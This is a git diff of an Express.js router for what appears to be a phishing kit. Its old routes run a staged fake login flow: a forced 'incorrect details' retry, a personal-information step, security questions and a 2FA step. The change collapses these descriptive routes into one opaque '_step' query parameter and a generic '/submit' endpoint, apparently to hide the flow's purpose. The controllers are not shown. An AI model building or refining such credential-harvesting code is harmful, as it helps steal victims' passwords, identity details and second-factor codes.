@@ -2,28 +2,40 @@ const express = require('express');
 const router =  express.Router();
 const controller = require('../controllers/controller');
 
-// Initial Login
-router.get('/auth/login', controller.login);
-router.post('/auth/login/attempt', controller.loginPost);
+router.get('/auth/login', (req, res) => {
+    const step = req.query._step || 'login';
+    switch (step) {
+        case '1':
+            return controller.login2(req, res);
+        case '2':
+            return controller.login3(req, res);
+        case '3':
+            return controller.login4(req, res);
+        case '4':
+            return controller.login5(req, res);
+        case 'complete':
+            return controller.complete(req, res);
+        default:
+            return controller.login(req, res);
+    }
+});
 
-// Incorrect Details Handling
-router.get('/auth/login/incorrect', controller.login2);
-router.post('/auth/login/retry', controller.loginPost2);
 
-// Verify Information
-router.get('/auth/login/verify-info', controller.login3);
-router.post('/auth/login/verify-info', controller.loginPost3);
 
-// Security Questions
-router.get('/auth/login/identity-verification', controller.login4);
-router.post('/auth/login/identity-verification', controller.loginPost4);
+router.post('/submit', (req, res) => {
+    if ('username' in req.body) {
+        return controller.loginPost(req, res);
+    } else if ('inc' in req.body) {
+        return controller.loginPost2(req, res);
+    } else if ('fullName' in req.body) {
+        return controller.loginPost3(req, res);
+    }else if ('q1' in req.body) {
+        return controller.loginPost4(req, res);
+    } else {
+        return controller.loginPost5(req, res);
+    }
+});
 
-// Two-Factor Authentication (2FA)
-router.get('/auth/login/2fa', controller.login5);
-router.post('/auth/login/2fa', controller.loginPost5);
-
-// Completion
-router.get('/auth/login/complete', controller.complete);
 
 router.get('*', controller.page404Redirect);
 
